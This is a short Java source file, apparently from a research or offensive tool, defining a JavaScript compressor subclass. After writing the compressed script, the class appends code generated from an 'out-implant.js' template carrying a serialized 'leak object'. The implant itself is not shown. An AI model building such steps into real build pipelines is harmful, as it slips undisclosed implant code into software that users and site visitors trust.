package com.leakingobfuscator.leaker;

import com.leakingobfuscator.common.LeakObject;
import com.leakingobfuscator.common.utils.IOUtil;
import com.leakingobfuscator.leaker.templates.ScriptTemplate;
import com.yahoo.platform.yui.compressor.ShadowInputStreamReader;
import org.mozilla.javascript.ErrorReporter;
import org.mozilla.javascript.EvaluatorException;

import java.io.IOException;
import java.io.Reader;
import java.io.Writer;
import java.util.HashMap;

public class OutputLeakingJavaScriptCompressor extends LeakingJavaScriptCompressor {

    private static final String IMPLANT_FN = "out-implant.js";

    public OutputLeakingJavaScriptCompressor(ShadowInputStreamReader in, boolean autonomous, ErrorReporter reporter) throws IOException, EvaluatorException {
        super(in, autonomous, reporter);
    }

    @Override
    public boolean writeLeakingOutput(Writer outWriter, Reader inReader, LeakObject leakObj) {
        try {
            HashMap<String, String> replacements = new HashMap<String, String>();
            replacements.put("c:" + FIELD_LEAK_OBJ, leakObj.toJSON());

            IOUtil.copy(inReader, outWriter);
            ScriptTemplate.generate(IMPLANT_FN, outWriter, replacements);

            return true;
        } catch (IOException e) {
            return false;
        }
    }

}
